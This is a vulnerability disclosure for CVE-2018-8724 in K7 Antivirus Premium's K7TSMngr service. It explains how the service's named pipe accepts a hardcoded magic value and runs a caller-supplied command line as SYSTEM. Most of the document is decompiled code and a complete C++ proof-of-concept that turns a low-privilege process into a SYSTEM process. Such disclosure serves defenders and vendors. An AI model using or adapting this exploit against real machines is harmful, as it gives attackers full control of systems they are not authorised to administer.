# CVE-2018-8724

# Product / Component Affected

* **Product**: *K7 Antivirus Premium 15.1.0.53* 
* **Component**: *K7TSMngr.exe 16.0.0.70*

# Summary

This is a logical flaw that will allows the creation of SYSTEM integrity processes via the pipe handler. Therefore a LOW privilege process can simply spawn up a SYSTEM process achieving LPE.

# K7TSMngr.exe Pipe Handler Background
This background piece will help understand this and will be referenced by other vulnerabilities identified in this service.

In the K7TSMngr.exe service there is an exposed pipe interface *\\\\.\\pipe\\K7TSMngrService1* which allows lower privileged processes to communicate with the K7TSMngr service running as SYSTEM, requesting certain tasks to be performed. The pipe is created (Kernel32!CreateNamedPipeA) and connected to (Kernel32!ConnectNamePipe) in the function tarting 0x409D80 (sub_409D80).

When a connection is made, the function handler routine (sub_4095A0) is called reads the input data in 2 parts:
* It reads a 28 (0x1c) byte header first which includes:
  * A magic value which you need to provide to *authenticate* with the service
  * Id of the function/service to invoke
  * Size of the input buffer
  * Size of another buffer (not 100%)
* Then it reads the actual data into newly allocated heap buffer.

Once it has all the data, it invokes *sub_409480* which enumeates through a list of pipe functions listed at 0x445B14. This list is a series of hard coded structures, each with the entry:

```C++
typedef struct _FUNCTION_ENTRY
{
    DWORD dwFunctionId;
    PVOID pfnFunction;
    DWORD dwNotSure;
} FUNCTION_ENTRY, *PFUNCTION_ENTRY
```

There are 23 functions that can be invoked, quite a few of which do interesting actions, or have vulnerabilities in them (see other CVEs).

# Details
Following on from the background piece above, if the handler is connected to from a LOW integrity process and called with function id 0x10015, it will invoke the function sub_409CA0.

The following snippet of code is from the HexRays decompiler illustrating what the function does.

```C++
//
// Structure Definitions
//
typedef struct _unk_10015
{
    DWORD dwInSize;
    DWORD dwMagic;
    DWORD dwFlags;
    DWORD dwTimeToWait
    DWORD field_10;
    CHAR szCommandLine[1024];
    CHAR szCurrentDirectory[260];
} unk_10015;


// Handler for 0x10015, sub_409CA0 or CreateProcessWrapper_2 as I named it in my view.
unk_10015 *__stdcall CreateProcessWrapper_2(int dwInSize, unk_10015 *pInput, int dwOutSize, int pOutput, int a5)
{
    if ( (unsigned int)dwInSize < 0x518 )
        return 0;
    if ( IsBadReadPtr(pInput, 0x518u) || pInput->dwInSize != 0x518 || pInput->dwMagic != 0x4B37544B )
        return 0;
    hProcess = GetProcessHeap();
    pData = (unk_10015 *)HeapAlloc(hProcess, 0, 0x518u);
    if ( !pData )
        return 0;

    // We control all of pInput, and thus pData.
    qmemcpy(pData, pInput, sizeof(unk_10015));
    dwFlags = pData->dwFlags;
    if ( dwFlags & 1 )
        // Details of this routine below... but generally calls through to a CreateProcessA call
        // with information passed to it from the calling process.
        CreateProcessWrapper(pData->szCommandLine, dwFlags, pData->szCurrentDirectory);
    
    // ...
    return result;
}


signed int __usercall CreateProcessWrapper@<eax>(CHAR *lpCommandLine_1@<eax>, char dwFlags, const CHAR *lpCurrentDirectory)
{
    // ... Locals ...

    bSuccess = 0;
    lpCommandLine = lpCommandLine_1;

    // Note: We control dwFlags so we can easily enter this
    if ( g_bFlag_WantNotZero_4494BC || !(dwFlags & 8) )
    {
        lpStartupInfo = (STARTUPINFOA *)operator new(0x44u);
        pProcInfo = (PROCESS_INFORMATION *)operator new(0x10u);
        lpProcINfo = pProcInfo;
        if ( lpStartupInfo )
        {
            if ( pProcInfo )
            {
                // ... and straight through to a create process call
                memset(lpStartupInfo, 0, 0x44u);
                lpStartupInfo->cb = 68;
                bSuccess = CreateProcessA(0, lpCommandLine, 0, 0, 0, 0x20u, 0, lpCurrentDirectory, lpStartupInfo, lpProcINfo);

    // ...

    return result;
}

```


# PoC Code
This PoC code will cause the K7TSMngr service to call Kernel32!CreateProcessA on the string provided to it on the command line.


```C++
// Includes
#include <Windows.h>
#include <stdio.h>


// unk1 - named used in IDA so kept for consistency. This is really the header of the pipe message
// which needs to be the first 0x1C bytes of every pipe message.
typedef struct _unk1
{
	DWORD dwMagic;
	DWORD dwControlCode;
	DWORD dwInSize;
	DWORD field_c;
	DWORD dwFunctionId;
	DWORD dwInputDataSize;
	DWORD dwOutputDataSize;
} unk1;

// Again, name from IDA. This is the structure of the pipe message required for the 0x1
typedef struct _unk_10015
{
	DWORD dwInSize;
	DWORD dwMagic;
	DWORD dwFlags;
	DWORD dwTimeToWait;
	DWORD dwDontCare;
	CHAR szCommandLine[1024];
	CHAR szCurrentDir[260];
} unk_10015;


int main(int argc, char** argv)
{
	if (argc != 2)
	{
		printf("Usage: <AppToRunAsSystem>\r\n");
		return 0;
	}

	HANDLE hPipe = CreateFileA("\\\\.\\pipe\\K7TSMngrService1", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hPipe == INVALID_HANDLE_VALUE)
	{
		printf("CreateFileW Failed: 0x%08x\r\n", GetLastError());
		return 0;
	}

	unk1 u1 = { 0 };
    // The following 3 values are hard coded as they are hard coded checks at 0x4095FA
    u1.dwMagic = 0x4B375453;
	u1.dwControlCode = 0x1010;
	u1.dwInSize = 28;

    // Function to call
	u1.dwFunctionId = 0x10015;
	u1.dwInputDataSize = 0x518;
	u1.dwOutputDataSize = 0x100;	

    // Send the header
	DWORD dwBytesWritten = 0;
	if (!WriteFile(hPipe, &u1, sizeof(u1), &dwBytesWritten, NULL))
	{
		printf("WriteFile 1 Failed: 0x%08x\r\n", GetLastError());
		return 0;
	}

    // Fill in and send over the data packet to the service.
	unk_10015 apiCall = { 0 };
	apiCall.dwInSize = 0x518;
	apiCall.dwMagic = 0x4B37544B;
	apiCall.dwFlags = 1; // We don't want 8 set
	strncpy_s(apiCall.szCommandLine, argv[1], 1024);
	strncpy_s(apiCall.szCurrentDir, "C:\\", 260);

	if (!WriteFile(hPipe, &apiCall, sizeof(apiCall), &dwBytesWritten, NULL))
	{
		printf("WriteFile 1 Failed: 0x%08x\r\n", GetLastError());
		return 0;
	}

    return 0;
}


```
